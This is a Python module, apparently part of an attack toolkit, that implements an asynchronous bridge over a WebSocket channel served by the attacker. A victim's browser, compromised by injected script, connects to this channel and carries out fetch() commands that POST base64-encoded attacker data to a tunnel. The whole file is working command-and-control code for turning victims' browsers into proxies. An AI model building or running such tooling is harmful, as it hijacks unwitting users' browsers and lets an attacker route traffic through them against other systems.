"""Async bridge between the browser-injection adapter and the WebSocket
control channel served by the attacker.

The victim's browser connects via WebSocket and executes fetch() commands
on behalf of the attacker.
"""

from __future__ import annotations

import asyncio
import base64
import logging
from typing import Any

LOG = logging.getLogger("attack.browser_bridge")


class BrowserBridge:
    def __init__(self) -> None:
        self._ws: Any = None
        self._pending: dict[int, asyncio.Future] = {}
        self._next_id = 0
        self._ready = asyncio.Event()

    @property
    def connected(self) -> bool:
        return self._ws is not None and not self._ws.closed

    def set_ws(self, ws: Any) -> None:
        self._ws = ws
        self._ready.set()

    def clear_ws(self) -> None:
        self._ws = None
        self._ready.clear()
        for fut in self._pending.values():
            if not fut.done():
                fut.cancel()
        self._pending.clear()

    async def wait_ready(self, timeout: float = 120) -> None:
        await asyncio.wait_for(self._ready.wait(), timeout=timeout)

    async def inject(self, data: bytes) -> None:
        """Tell the browser to POST *data* to the tunnel and wait."""
        if not self.connected:
            raise RuntimeError("browser not connected")
        msg_id = self._next_id
        self._next_id += 1
        fut = asyncio.get_running_loop().create_future()
        self._pending[msg_id] = fut
        await self._ws.send_json({
            "cmd": "fetch",
            "id": msg_id,
            "body": base64.b64encode(data).decode("ascii"),
        })
        try:
            await asyncio.wait_for(fut, timeout=30)
        finally:
            self._pending.pop(msg_id, None)

    def on_message(self, data: dict) -> None:
        cmd = data.get("cmd")
        if cmd == "done":
            msg_id = data.get("id")
            fut = self._pending.get(msg_id)
            if fut and not fut.done():
                fut.set_result(None)
        elif cmd == "ready":
            LOG.info("browser reported ready")
